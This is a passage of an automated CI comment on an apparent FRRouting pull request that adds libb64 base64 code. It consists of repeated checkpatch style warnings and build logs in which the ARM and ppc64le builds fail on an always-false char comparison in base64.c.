/tmp/f1-15866/base64.c:123:\n    +\t\t44,45,46,47,48,49,50,51\n     \t\t        ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #123: FILE: /tmp/f1-15866/base64.c:123:\n    +\t\t44,45,46,47,48,49,50,51\n     \t\t           ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #123: FILE: /tmp/f1-15866/base64.c:123:\n    +\t\t44,45,46,47,48,49,50,51\n     \t\t              ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #123: FILE: /tmp/f1-15866/base64.c:123:\n    +\t\t44,45,46,47,48,49,50,51\n     \t\t                 ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #123: FILE: /tmp/f1-15866/base64.c:123:\n    +\t\t44,45,46,47,48,49,50,51\n     \t\t                    ^\n    \n    WARNING: Missing a blank line after declarations\n    #126: FILE: /tmp/f1-15866/base64.c:126:\n    +\tstatic const char decoding_size = sizeof(decoding);\n    +\tvalue_in -= 43;\n    \n    ERROR: trailing statements should be on next line\n    #127: FILE: /tmp/f1-15866/base64.c:127:\n    +\tif (value_in < 0 || value_in >= decoding_size) return -1;\n    \n    ERROR: \"foo* bar\" should be \"foo *bar\"\n    #131: FILE: /tmp/f1-15866/base64.c:131:\n    +void base64_init_decodestate(base64_decodestate* state_in)\n    \n    ERROR: \"foo* bar\" should be \"foo *bar\"\n    #137: FILE: /tmp/f1-15866/base64.c:137:\n    +int base64_decode_block(const char* code_in, int length_in, char* plaintext_out,\n    \n    ERROR: \"foo* bar\" should be \"foo *bar\"\n    #137: FILE: /tmp/f1-15866/base64.c:137:\n    +int base64_decode_block(const char* code_in, int length_in, char* plaintext_out,\n    \n    ERROR: \"foo* bar\" should be \"foo *bar\"\n    #138: FILE: /tmp/f1-15866/base64.c:138:\n    +\t\t\tbase64_decodestate* state_in)\n    \n    ERROR: \"foo* bar\" should be \"foo *bar\"\n    #140: FILE: /tmp/f1-15866/base64.c:140:\n    +\tconst char* codechar = code_in;\n    \n    ERROR: \"foo* bar\" should be \"foo *bar\"\n    #141: FILE: /tmp/f1-15866/base64.c:141:\n    +\tchar* plainchar = plaintext_out;\n    \n    ERROR: that open brace { should be on the previous line\n    #146: FILE: /tmp/f1-15866/base64.c:146:\n    +\tswitch (state_in->step)\n    +\t{\n    \n    ERROR: that open brace { should be on the previous line\n    #148: FILE: /tmp/f1-15866/base64.c:148:\n    +\t\twhile (1)\n    +\t\t{\n    \n    WARNING: suspect code indent for conditional statements (16, 16)\n    #148: FILE: /tmp/f1-15866/base64.c:148:\n    +\t\twhile (1)\n    +\t\t{\n    \n    ERROR: that open brace { should be on the previous line\n    #152: FILE: /tmp/f1-15866/base64.c:152:\n    +\t\t\t\tif (codechar == code_in+length_in)\n    +\t\t\t\t{\n    \n    WARNING: line over 80 characters\n    #158: FILE: /tmp/f1-15866/base64.c:158:\n    +\t\t\t\tfragment = (char)base64_decode_value(*codechar++);\n    \n    ERROR: that open brace { should be on the previous line\n    #164: FILE: /tmp/f1-15866/base64.c:164:\n    +\t\t\t\tif (codechar == code_in+length_in)\n    +\t\t\t\t{\n    \n    WARNING: line over 80 characters\n    #170: FILE: /tmp/f1-15866/base64.c:170:\n    +\t\t\t\tfragment = (char)base64_decode_value(*codechar++);\n    \n    ERROR: that open brace { should be on the previous line\n    #177: FILE: /tmp/f1-15866/base64.c:177:\n    +\t\t\t\tif (codechar == code_in+length_in)\n    +\t\t\t\t{\n    \n    WARNING: line over 80 characters\n    #183: FILE: /tmp/f1-15866/base64.c:183:\n    +\t\t\t\tfragment = (char)base64_decode_value(*codechar++);\n    \n    ERROR: that open brace { should be on the previous line\n    #190: FILE: /tmp/f1-15866/base64.c:190:\n    +\t\t\t\tif (codechar == code_in+length_in)\n    +\t\t\t\t{\n    \n    WARNING: line over 80 characters\n    #196: FILE: /tmp/f1-15866/base64.c:196:\n    +\t\t\t\tfragment = (char)base64_decode_value(*codechar++);\n    Report for base64.h | 85 issues\n    ===============================================\n    WARNING: Block comments use * on subsequent lines\n    #2: FILE: /tmp/f1-15866/base64.h:2:\n    +/*\n    +This is part of the libb64 project, and has been placed in the public domain.\n    \n    WARNING: do not add new typedefs\n    #9: FILE: /tmp/f1-15866/base64.h:9:\n    +typedef enum\n    \n    ERROR: open brace '{' following enum go on the same line\n    #10: FILE: /tmp/f1-15866/base64.h:10:\n    +typedef enum\n    +{\n    \n    WARNING: do not add new typedefs\n    #14: FILE: /tmp/f1-15866/base64.h:14:\n    +typedef struct\n    \n    ERROR: open brace '{' following struct go on the same line\n    #15: FILE: /tmp/f1-15866/base64.h:15:\n    +typedef struct\n    +{\n    \n    ERROR: \"foo* bar\" should be \"foo *bar\"\n    #21: FILE: /tmp/f1-15866/base64.h:21:\n    +void base64_init_encodestate(base64_encodestate* state_in);\n    \n    ERROR: \"foo* bar\" should be \"foo *bar\"\n    #25: FILE: /tmp/f1-15866/base64.h:25:\n    +int base64_encode_block(const char* plaintext_in, int length_in, char* code_out,\n    \n    ERROR: \"foo* bar\" should be \"foo *bar\"\n    #25: FILE: /tmp/f1-15866/base64.h:25:\n    +int base64_encode_block(const char* plaintext_in, int length_in, char* code_out,\n    \n    ERROR: \"foo* bar\" should be \"foo *bar\"\n    #26: FILE: /tmp/f1-15866/base64.h:26:\n    +\t\t\tbase64_encodestate* state_in);\n    \n    ERROR: \"foo* bar\" should be \"foo *bar\"\n    #28: FILE: /tmp/f1-15866/base64.h:28:\n    +int base64_encode_blockend(char* code_out, base64_encodestate* state_in);\n    \n    ERROR: \"foo* bar\" should be \"foo *bar\"\n    #28: FILE: /tmp/f1-15866/base64.h:28:\n    +int base64_encode_blockend(char* code_out, base64_encodestate* state_in);\n    \n    WARNING: do not add new typedefs\n    #31: FILE: /tmp/f1-15866/base64.h:31:\n    +typedef enum\n    \n    ERROR: open brace '{' following enum go on the same line\n    #32: FILE: /tmp/f1-15866/base64.h:32:\n    +typedef enum\n    +{\n    \n    WARNING: do not add new typedefs\n    #36: FILE: /tmp/f1-15866/base64.h:36:\n    +typedef struct\n    \n    ERROR: open brace '{' following struct go on the same line\n    #37: FILE: /tmp/f1-15866/base64.h:37:\n    +typedef struct\n    +{\n    \n    ERROR: \"foo* bar\" should be \"foo *bar\"\n    #42: FILE: /tmp/f1-15866/base64.h:42:\n    +void base64_init_decodestate(base64_decodestate* state_in);\n    \n    ERROR: \"foo* bar\" should be \"foo *bar\"\n    #46: FILE: /tmp/f1-15866/base64.h:46:\n    +int base64_decode_block(const char* code_in, int length_in, char* plaintext_out,\n    \n    ERROR: \"foo* bar\" should be \"foo *bar\"\n    #46: FILE: /tmp/f1-15866/base64.h:46:\n    +int base64_decode_block(const char* code_in, int length_in, char* plaintext_out,\n    \n    ERROR: \"foo* bar\" should be \"foo *bar\"\n    #47: FILE: /tmp/f1-15866/base64.h:47:\n    +\t\t\tbase64_decodestate* state_in);\n    \n    WARNING: C99 // comments do not match recommendation\n    #49: FILE: /tmp/f1-15866/base64.h:49:\n    +#endif //_BASE64_H_\n    Report for yang_wrappers.c | 8 issues\n    ===============================================\n    < WARNING: Missing a blank line after declarations\n    < #688: FILE: /tmp/f1-15866/yang_wrappers.c:688:\n    < WARNING: Missing a blank line after declarations\n    < #691: FILE: /tmp/f1-15866/yang_wrappers.c:691:\n    < WARNING: Missing a blank line after declarations\n    < #696: FILE: /tmp/f1-15866/yang_wrappers.c:696:\n    < WARNING: Missing a blank line after declarations\n    < #709: FILE: /tmp/f1-15866/yang_wrappers.c:709:\n\n</details>\n\n</details> <details><summary>Continuous Integration Result: FAILED</summary>\n\n#  Continuous Integration Result: FAILED\n\nSee below for issues.\nCI System Testrun URL: https://ci1.netdef.org/browse/FRR-PULLREQ2-3565/\n\nThis is a comment from an automated CI system.\nFor questions and feedback in regards to this CI system, please feel free to email\nMartin Winter - mwinter (at) opensourcerouting.org.\n\n### Get source / Pull Request: Successful\n### Building Stage: Failed\n<details>\n<summary>Ubuntu 18.04 arm7 build: Failed (click for details)</summary>\n\n__Make failed for Ubuntu 18.04 arm7 build__:\n    (see full Make log at https://ci1.netdef.org/browse/FRR-PULLREQ2-3565/artifact/U18ARM7BUILD/ErrorLog/log_make.txt)\n\n    make[1]: Entering directory '/home/ci/cibuild.3565/frr-source'\n    lib/base64.c: In function base64_decode_value:\n    lib/base64.c:127:15: error: comparison is always false due to limited range of data type [-Werror=type-limits]\n    cc1: all warnings being treated as errors\n    Makefile:9605: recipe for target 'lib/base64.lo' failed\n    make[1]: *** [lib/base64.lo] Error 1\n    isisd/isis_cli.c: In function isis_sr_local_block_label_range_magic:\n    isisd/isis_cli.c:1574:1: note: #pragma message: Use of the local-block command is deprecated\n     CPP_NOTICE(\"Use of the local-block command is deprecated\")\n\nUbuntu 18.04 arm7 build: Unknown Log <config.log.gz>\n    URL: https://ci1.netdef.org/browse/FRR-PULLREQ2-3565/artifact/U18ARM7BUILD/config.log/config.log.gz\nUbuntu 18.04 arm7 build: config.status output from configure script can be found at https://ci1.netdef.org/browse/FRR-PULLREQ2-3565/artifact/U18ARM7BUILD/config.status/config.status\n</details>\n<details>\n<summary>Ubuntu 16.04 arm7 build: Failed (click for details)</summary>\nUbuntu 16.04 arm7 build: config.status output from configure script can be found at https://ci1.netdef.org/browse/FRR-PULLREQ2-3565/artifact/CI101BUILD/config.status/config.status\nUbuntu 16.04 arm7 build: Unknown Log <config.log.gz>\n    URL: https://ci1.netdef.org/browse/FRR-PULLREQ2-3565/artifact/CI101BUILD/config.log/config.log.gz\n\n__Make failed for Ubuntu 16.04 arm7 build__:\n    (see full Make log at https://ci1.netdef.org/browse/FRR-PULLREQ2-3565/artifact/CI101BUILD/ErrorLog/log_make.txt)\n\n    make[1]: Entering directory '/home/ci/cibuild.3565/frr-source'\n    lib/base64.c: In function base64_decode_value:\n    lib/base64.c:127:15: error: comparison is always false due to limited range of data type [-Werror=type-limits]\n    cc1: all warnings being treated as errors\n    Makefile:9605: recipe for target 'lib/base64.lo' failed\n    make[1]: *** [lib/base64.lo] Error 1\n    /home/ci/cibuild.3565/frr-source/doc/user/zebra.rst:23: SEVERE: Duplicate ID: \"cmdoption-configure-arg-net\".\n    /home/ci/cibuild.3565/frr-source/doc/user/zebra.rst:23: SEVERE: Duplicate ID: \"cmdoption-configure-arg-net\".\n    /home/ci/cibuild.3565/frr-source/doc/user/zebra.rst:23: SEVERE: Duplicate ID: \"cmdoption-configure-arg-net\".\n\n</details>\n<details>\n<summary>Ubuntu 16.04 arm8 build: Failed (click for details)</summary>\n\n__Make failed for Ubuntu 16.04 arm8 build__:\n    (see full Make log at https://ci1.netdef.org/browse/FRR-PULLREQ2-3565/artifact/U16ARM8BUILD/ErrorLog/log_make.txt)\n\n    make[1]: Entering directory '/home/ci/cibuild.3565/frr-source'\n    lib/base64.c: In function base64_decode_value:\n    lib/base64.c:127:15: error: comparison is always false due to limited range of data type [-Werror=type-limits]\n    cc1: all warnings being treated as errors\n    Makefile:9605: recipe for target 'lib/base64.lo' failed\n    make[1]: *** [lib/base64.lo] Error 1\n    /home/ci/cibuild.3565/frr-source/doc/user/zebra.rst:23: SEVERE: Duplicate ID: \"cmdoption-configure-arg-net\".\n    /home/ci/cibuild.3565/frr-source/doc/user/zebra.rst:23: SEVERE: Duplicate ID: \"cmdoption-configure-arg-net\".\n    /home/ci/cibuild.3565/frr-source/doc/user/zebra.rst:23: SEVERE: Duplicate ID: \"cmdoption-configure-arg-net\".\n\nUbuntu 16.04 arm8 build: Unknown Log <config.log.gz>\n    URL: https://ci1.netdef.org/browse/FRR-PULLREQ2-3565/artifact/U16ARM8BUILD/config.log/config.log.gz\nUbuntu 16.04 arm8 build: config.status output from configure script can be found at https://ci1.netdef.org/browse/FRR-PULLREQ2-3565/artifact/U16ARM8BUILD/config.status/config.status\n</details>\n<details>\n<summary>Ubuntu 18.04 arm8 build: Failed (click for details)</summary>\nUbuntu 18.04 arm8 build: config.status output from configure script can be found at https://ci1.netdef.org/browse/FRR-PULLREQ2-3565/artifact/U18ARM8BUILD/config.status/config.status\nUbuntu 18.04 arm8 build: Unknown Log <config.log.gz>\n    URL: https://ci1.netdef.org/browse/FRR-PULLREQ2-3565/artifact/U18ARM8BUILD/config.log/config.log.gz\n\n__Make failed for Ubuntu 18.04 arm8 build__:\n    (see full Make log at https://ci1.netdef.org/browse/FRR-PULLREQ2-3565/artifact/U18ARM8BUILD/ErrorLog/log_make.txt)\n\n    make[1]: Entering directory '/home/ci/cibuild.3565/frr-source'\n    lib/base64.c: In function base64_decode_value:\n    lib/base64.c:127:15: error: comparison is always false due to limited range of data type [-Werror=type-limits]\n    cc1: all warnings being treated as errors\n    Makefile:9605: recipe for target 'lib/base64.lo' failed\n    make[1]: *** [lib/base64.lo] Error 1\n    isisd/isis_cli.c: In function isis_sr_local_block_label_range_magic:\n    isisd/isis_cli.c:1574:1: note: #pragma message: Use of the local-block command is deprecated\n     CPP_NOTICE(\"Use of the local-block command is deprecated\")\n\n</details>\n<details>\n<summary>Ubuntu 18.04 ppc64le build: Failed (click for details)</summary>\n\n__Make failed for Ubuntu 18.04 ppc64le build__:\n    (see full Make log at https://ci1.netdef.org/browse/FRR-PULLREQ2-3565/artifact/U1804PPC64LEBUILD/ErrorLog/log_make.txt)\n\n    make[1]: Entering directory '/home/ci/cibuild.3565/frr-source'\n    lib/base64.c: In function base64_decode_value:\n    lib/base64.c:127:15: error: comparison is always false due to limited range of data type [-Werror=type-limits]\n    cc1: all warnings being treated as errors\n    Makefile:9605: recipe for target 'lib/base64.lo' failed\n    make[1]: *** [lib/base64.lo] Error 1\n    isisd/isis_cli.c: In function isis_sr_local_block_label_range_magic:\n    isisd/isis_cli.c:1574:1: note: #pragma message: Use of the local-block command is deprecated\n     CPP_NOTICE(\"Use of the local-block command is deprecated\")\n\nUbuntu 18.04 ppc64le build: config.status output from configure script can be found at https://ci1.netdef.org/browse/FRR-PULLREQ2-3565/artifact/U1804PPC64LEBUILD/config.status/config.status\nUbuntu 18.04 ppc64le build: Unknown Log <config.log.gz>\n    URL: https://ci1.netdef.org/browse/FRR-PULLREQ2-3565/artifact/U1804PPC64LEBUILD/config.log/config.log.gz\n</details>\n<details><summary>Successful on other platforms/tests</summary>\n\n- CentOS 7 amd64 build\n- Debian 11 amd64 build\n- Ubuntu 16.04 i386 build\n- Ubuntu 18.04 amd64 build\n- FreeBSD 11 amd64 build\n- Ubuntu 16.04 amd64 build\n- FreeBSD 12 amd64 build\n- NetBSD 9 amd64 build\n- Ubuntu 18.04 i386 build\n- Redhat 8 amd64 build\n- OpenBSD 7 amd64 build\n- Ubuntu 20.04 amd64 build\n- Debian 9 amd64 build\n- Fedora 29 amd64 build\n- Debian 10 amd64 build\n</details>\n\n### Warnings Generated during build:\n\n<details><summary>Checkout code: Successful with additional warnings</summary>\n<details>\n<summary>Ubuntu 18.04 arm7 build: Failed (click for details)</summary>\n\n__Make failed for Ubuntu 18.04 arm7 build__:\n    (see full Make log at https://ci1.netdef.org/browse/FRR-PULLREQ2-3565/artifact/U18ARM7BUILD/ErrorLog/log_make.txt)\n\n    make[1]: Entering directory '/home/ci/cibuild.3565/frr-source'\n    lib/base64.c: In function base64_decode_value:\n    lib/base64.c:127:15: error: comparison is always false due to limited range of data type [-Werror=type-limits]\n    cc1: all warnings being treated as errors\n    Makefile:9605: recipe for target 'lib/base64.lo' failed\n    make[1]: *** [lib/base64.lo] Error 1\n    isisd/isis_cli.c: In function isis_sr_local_block_label_range_magic:\n    isisd/isis_cli.c:1574:1: note: #pragma message: Use of the local-block command is deprecated\n     CPP_NOTICE(\"Use of the local-block command is deprecated\")\n\nUbuntu 18.04 arm7 build: Unknown Log <config.log.gz>\n    URL: https://ci1.netdef.org/browse/FRR-PULLREQ2-3565/artifact/U18ARM7BUILD/config.log/config.log.gz\nUbuntu 18.04 arm7 build: config.status output from configure script can be found at https://ci1.netdef.org/browse/FRR-PULLREQ2-3565/artifact/U18ARM7BUILD/config.status/config.status\n</details>\n<details>\n<summary>Ubuntu 16.04 arm7 build: Failed (click for details)</summary>\nUbuntu 16.04 arm7 build: config.status output from configure script can be found at https://ci1.netdef.org/browse/FRR-PULLREQ2-3565/artifact/CI101BUILD/config.status/config.status\nUbuntu 16.04 arm7 build: Unknown Log <config.log.gz>\n    URL: https://ci1.netdef.org/browse/FRR-PULLREQ2-3565/artifact/CI101BUILD/config.log/config.log.gz\n\n__Make failed for Ubuntu 16.04 arm7 build__:\n    (see full Make log at https://ci1.netdef.org/browse/FRR-PULLREQ2-3565/artifact/CI101BUILD/ErrorLog/log_make.txt)\n\n    make[1]: Entering directory '/home/ci/cibuild.3565/frr-source'\n    lib/base64.c: In function base64_decode_value:\n    lib/base64.c:127:15: error: comparison is always false due to limited range of data type [-Werror=type-limits]\n    cc1: all warnings being treated as errors\n    Makefile:9605: recipe for target 'lib/base64.lo' failed\n    make[1]: *** [lib/base64.lo] Error 1\n    /home/ci/cibuild.3565/frr-source/doc/user/zebra.rst:23: SEVERE: Duplicate ID: \"cmdoption-configure-arg-net\".\n    /home/ci/cibuild.3565/frr-source/doc/user/zebra.rst:23: SEVERE: Duplicate ID: \"cmdoption-configure-arg-net\".\n    /home/ci/cibuild.3565/frr-source/doc/user/zebra.rst:23: SEVERE: Duplicate ID: \"cmdoption-configure-arg-net\".\n\n</details>\n<details>\n<summary>Ubuntu 16.04 arm8 build: Failed (click for details)</summary>\n\n__Make failed for Ubuntu 16.04 arm8 build__:\n    (see full Make log at https://ci1.netdef.org/browse/FRR-PULLREQ2-3565/artifact/U16ARM8BUILD/ErrorLog/log_make.txt)\n\n    make[1]: Entering directory '/home/ci/cibuild.3565/frr-source'\n    lib/base64.c: In function base64_decode_value:\n    lib/base64.c:127:15: error: comparison is always false due to limited range of data type [-Werror=type-limits]\n    cc1: all warnings being treated as errors\n    Makefile:9605: recipe for target 'lib/base64.lo' failed\n    make[1]: *** [lib/base64.lo] Error 1\n    /home/ci/cibuild.3565/frr-source/doc/user/zebra.rst:23: SEVERE: Duplicate ID: \"cmdoption-configure-arg-net\".\n    /home/ci/cibuild.3565/frr-source/doc/user/zebra.rst:23: SEVERE: Duplicate ID: \"cmdoption-configure-arg-net\".\n    /home/ci/cibuild.3565/frr-source/doc/user/zebra.rst:23: SEVERE: Duplicate ID: \"cmdoption-configure-arg-net\".\n\nUbuntu 16.04 arm8 build: Unknown Log <config.log.gz>\n    URL: https://ci1.netdef.org/browse/FRR-PULLREQ2-3565/artifact/U16ARM8BUILD/config.log/config.log.gz\nUbuntu 16.04 arm8 build: config.status output from configure script can be found at https://ci1.netdef.org/browse/FRR-PULLREQ2-3565/artifact/U16ARM8BUILD/config.status/config.status\n</details>\n<details>\n<summary>Ubuntu 18.04 arm8 build: Failed (click for details)</summary>\nUbuntu 18.04 arm8 build: config.status output from configure script can be found at https://ci1.netdef.org/browse/FRR-PULLREQ2-3565/artifact/U18ARM8BUILD/config.status/config.status\nUbuntu 18.04 arm8 build: Unknown Log <config.log.gz>\n    URL: https://ci1.netdef.org/browse/FRR-PULLREQ2-3565/artifact/U18ARM8BUILD/config.log/config.log.gz\n\n__Make failed for Ubuntu 18.04 arm8 build__:\n    (see full Make log at https://ci1.netdef.org/browse/FRR-PULLREQ2-3565/artifact/U18ARM8BUILD/ErrorLog/log_make.txt)\n\n    make[1]: Entering directory '/home/ci/cibuild.3565/frr-source'\n    lib/base64.c: In function base64_decode_value:\n    lib/base64.c:127:15: error: comparison is always false due to limited range of data type [-Werror=type-limits]\n    cc1: all warnings being treated as errors\n    Makefile:9605: recipe for target 'lib/base64.lo' failed\n    make[1]: *** [lib/base64.lo] Error 1\n    isisd/isis_cli.c: In function isis_sr_local_block_label_range_magic:\n    isisd/isis_cli.c:1574:1: note: #pragma message: Use of the local-block command is deprecated\n     CPP_NOTICE(\"Use of the local-block command is deprecated\")\n\n</details>\n<details>\n<summary>Ubuntu 18.04 ppc64le build: Failed (click for details)</summary>\n\n__Make failed for Ubuntu 18.04 ppc64le build__:\n    (see full Make log at https://ci1.netdef.org/browse/FRR-PULLREQ2-3565/artifact/U1804PPC64LEBUILD/ErrorLog/log_make.txt)\n\n    make[1]: Entering directory '/home/ci/cibuild.3565/frr-source'\n    lib/base64.c: In function base64_decode_value:\n    lib/base64.c:127:15: error: comparison is always false due to limited range of data type [-Werror=type-limits]\n    cc1: all warnings being treated as errors\n    Makefile:9605: recipe for target 'lib/base64.lo' failed\n    make[1]: *** [lib/base64.lo] Error 1\n    isisd/isis_cli.c: In function isis_sr_local_block_label_range_magic:\n    isisd/isis_cli.c:1574:1: note: #pragma message: Use of the local-block command is deprecated\n     CPP_NOTICE(\"Use of the local-block command is deprecated\")\n\nUbuntu 18.04 ppc64le build: config.status output from configure script can be found at https://ci1.netdef.org/browse/FRR-PULLREQ2-3565/artifact/U1804PPC64LEBUILD/config.status/config.status\nUbuntu 18.04 ppc64le build: Unknown Log <config.log.gz>\n    URL: https://ci1.netdef.org/browse/FRR-PULLREQ2-3565/artifact/U1804PPC64LEBUILD/config.log/config.log.gz\n</details>\n\n    <stdin>:286: new blank line at EOF.\n    +\n    warning: 1 line adds whitespace errors.\n    Report for base64.c | 77 issues\n    ===============================================\n    WARNING: Block comments use * on subsequent lines\n    #2: FILE: /tmp/f1-1729/base64.c:2:\n    +/*\n    +This is part of the libb64 project, and has been placed in the public domain.\n    \n    ERROR: \"foo* bar\" should be \"foo *bar\"\n    #10: FILE: /tmp/f1-1729/base64.c:10:\n    +void base64_init_encodestate(base64_encodestate* state_in)\n    \n    WARNING: line over 80 characters\n    #19: FILE: /tmp/f1-1729/base64.c:19:\n    +\tstatic const char* encoding = \"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/\";\n    \n    ERROR: \"foo* bar\" should be \"foo *bar\"\n    #19: FILE: /tmp/f1-1729/base64.c:19:\n    +\tstatic const char* encoding = \"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/\";\n    \n    WARNING: Missing a blank line after declarations\n    #20: FILE: /tmp/f1-1729/base64.c:20:\n    +\tstatic const char* encoding = \"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/\";\n    +\tif (value_in > 63) return '=';\n    \n    ERROR: trailing statements should be on next line\n    #20: FILE: /tmp/f1-1729/base64.c:20:\n    +\tif (value_in > 63) return '=';\n    \n    WARNING: line over 80 characters\n    #24: FILE: /tmp/f1-1729/base64.c:24:\n    +int base64_encode_block(const char* plaintext_in, int length_in, char* code_out, base64_encodestate* state_in)\n    \n    ERROR: \"foo* bar\" should be \"foo *bar\"\n    #24: FILE: /tmp/f1-1729/base64.c:24:\n    +int base64_encode_block(const char* plaintext_in, int length_in, char* code_out, base64_encodestate* state_in)\n    \n    ERROR: \"foo* bar\" should be \"foo *bar\"\n    #24: FILE: /tmp/f1-1729/base64.c:24:\n    +int base64_encode_block(const char* plaintext_in, int length_in, char* code_out, base64_encodestate* state_in)\n    \n    ERROR: \"foo* bar\" should be \"foo *bar\"\n    #24: FILE: /tmp/f1-1729/base64.c:24:\n    +int base64_encode_block(const char* plaintext_in, int length_in, char* code_out, base64_encodestate* state_in)\n    \n    ERROR: \"foo* bar\" should be \"foo *bar\"\n    #26: FILE: /tmp/f1-1729/base64.c:26:\n    +\tconst char* plainchar = plaintext_in;\n    \n    ERROR: \"foo* const bar\" should be \"foo * const bar\"\n    #27: FILE: /tmp/f1-1729/base64.c:27:\n    +\tconst char* const plaintextend = plaintext_in + length_in;\n    \n    ERROR: \"foo* bar\" should be \"foo *bar\"\n    #28: FILE: /tmp/f1-1729/base64.c:28:\n    +\tchar* codechar = code_out;\n    \n    ERROR: that open brace { should be on the previous line\n    #34: FILE: /tmp/f1-1729/base64.c:34:\n    +\tswitch (state_in->step)\n    +\t{\n    \n    ERROR: that open brace { should be on the previous line\n    #36: FILE: /tmp/f1-1729/base64.c:36:\n    +\t\twhile (1)\n    +\t\t{\n    \n    WARNING: suspect code indent for conditional statements (16, 16)\n    #36: FILE: /tmp/f1-1729/base64.c:36:\n    +\t\twhile (1)\n    +\t\t{\n    \n    ERROR: that open brace { should be on the previous line\n    #39: FILE: /tmp/f1-1729/base64.c:39:\n    +\t\t\tif (plainchar == plaintextend)\n    +\t\t\t{\n    \n    ERROR: that open brace { should be on the previous line\n    #51: FILE: /tmp/f1-1729/base64.c:51:\n    +\t\t\tif (plainchar == plaintextend)\n    +\t\t\t{\n    \n    ERROR: that open brace { should be on the previous line\n    #63: FILE: /tmp/f1-1729/base64.c:63:\n    +\t\t\tif (plainchar == plaintextend)\n    +\t\t\t{\n    \n    ERROR: that open brace { should be on the previous line\n    #76: FILE: /tmp/f1-1729/base64.c:76:\n    +\t\t\tif (state_in->stepcount == CHARS_PER_LINE/4)\n    +\t\t\t{\n    \n    ERROR: \"foo* bar\" should be \"foo *bar\"\n    #87: FILE: /tmp/f1-1729/base64.c:87:\n    +int base64_encode_blockend(char* code_out, base64_encodestate* state_in)\n    \n    ERROR: \"foo* bar\" should be \"foo *bar\"\n    #87: FILE: /tmp/f1-1729/base64.c:87:\n    +int base64_encode_blockend(char* code_out, base64_encodestate* state_in)\n    \n    ERROR: \"foo* bar\" should be \"foo *bar\"\n    #89: FILE: /tmp/f1-1729/base64.c:89:\n    +\tchar* codechar = code_out;\n    \n    ERROR: that open brace { should be on the previous line\n    #91: FILE: /tmp/f1-1729/base64.c:91:\n    +\tswitch (state_in->step)\n    +\t{\n    \n    ERROR: space required after that ',' (ctx:VxO)\n    #114: FILE: /tmp/f1-1729/base64.c:114:\n    +\t\t62,-1,-1,-1,63,52,53,54,\n     \t\t  ^\n    \n    ERROR: space required before that '-' (ctx:OxV)\n    #114: FILE: /tmp/f1-1729/base64.c:114:\n    +\t\t62,-1,-1,-1,63,52,53,54,\n     \t\t   ^\n    \n    ERROR: space required after that ',' (ctx:VxO)\n    #114: FILE: /tmp/f1-1729/base64.c:114:\n    +\t\t62,-1,-1,-1,63,52,53,54,\n     \t\t     ^\n    \n    ERROR: space required before that '-' (ctx:OxV)\n    #114: FILE: /tmp/f1-1729/base64.c:114:\n    +\t\t62,-1,-1,-1,63,52,53,54,\n     \t\t      ^\n    \n    ERROR: space required after that ',' (ctx:VxO)\n    #114: FILE: /tmp/f1-1729/base64.c:114:\n    +\t\t62,-1,-1,-1,63,52,53,54,\n     \t\t        ^\n    \n    ERROR: space required before that '-' (ctx:OxV)\n    #114: FILE: /tmp/f1-1729/base64.c:114:\n    +\t\t62,-1,-1,-1,63,52,53,54,\n     \t\t         ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #114: FILE: /tmp/f1-1729/base64.c:114:\n    +\t\t62,-1,-1,-1,63,52,53,54,\n     \t\t           ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #114: FILE: /tmp/f1-1729/base64.c:114:\n    +\t\t62,-1,-1,-1,63,52,53,54,\n     \t\t              ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #114: FILE: /tmp/f1-1729/base64.c:114:\n    +\t\t62,-1,-1,-1,63,52,53,54,\n     \t\t                 ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #114: FILE: /tmp/f1-1729/base64.c:114:\n    +\t\t62,-1,-1,-1,63,52,53,54,\n     \t\t                    ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #115: FILE: /tmp/f1-1729/base64.c:115:\n    +\t\t55,56,57,58,59,60,61,-1,\n     \t\t  ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #115: FILE: /tmp/f1-1729/base64.c:115:\n    +\t\t55,56,57,58,59,60,61,-1,\n     \t\t     ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #115: FILE: /tmp/f1-1729/base64.c:115:\n    +\t\t55,56,57,58,59,60,61,-1,\n     \t\t        ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #115: FILE: /tmp/f1-1729/base64.c:115:\n    +\t\t55,56,57,58,59,60,61,-1,\n     \t\t           ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #115: FILE: /tmp/f1-1729/base64.c:115:\n    +\t\t55,56,57,58,59,60,61,-1,\n     \t\t              ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #115: FILE: /tmp/f1-1729/base64.c:115:\n    +\t\t55,56,57,58,59,60,61,-1,\n     \t\t                 ^\n    \n    ERROR: space required after that ',' (ctx:VxO)\n    #115: FILE: /tmp/f1-1729/base64.c:115:\n    +\t\t55,56,57,58,59,60,61,-1,\n     \t\t                    ^\n    \n    ERROR: space required before that '-' (ctx:OxV)\n    #115: FILE: /tmp/f1-1729/base64.c:115:\n    +\t\t55,56,57,58,59,60,61,-1,\n     \t\t                     ^\n    \n    ERROR: space required after that ',' (ctx:VxO)\n    #116: FILE: /tmp/f1-1729/base64.c:116:\n    +\t\t-1,-1,-2,-1,-1,-1,0,1,\n     \t\t  ^\n    \n    ERROR: space required before that '-' (ctx:OxV)\n    #116: FILE: /tmp/f1-1729/base64.c:116:\n    +\t\t-1,-1,-2,-1,-1,-1,0,1,\n     \t\t   ^\n    \n    ERROR: space required after that ',' (ctx:VxO)\n    #116: FILE: /tmp/f1-1729/base64.c:116:\n    +\t\t-1,-1,-2,-1,-1,-1,0,1,\n     \t\t     ^\n    \n    ERROR: space required before that '-' (ctx:OxV)\n    #116: FILE: /tmp/f1-1729/base64.c:116:\n    +\t\t-1,-1,-2,-1,-1,-1,0,1,\n     \t\t      ^\n    \n    ERROR: space required after that ',' (ctx:VxO)\n    #116: FILE: /tmp/f1-1729/base64.c:116:\n    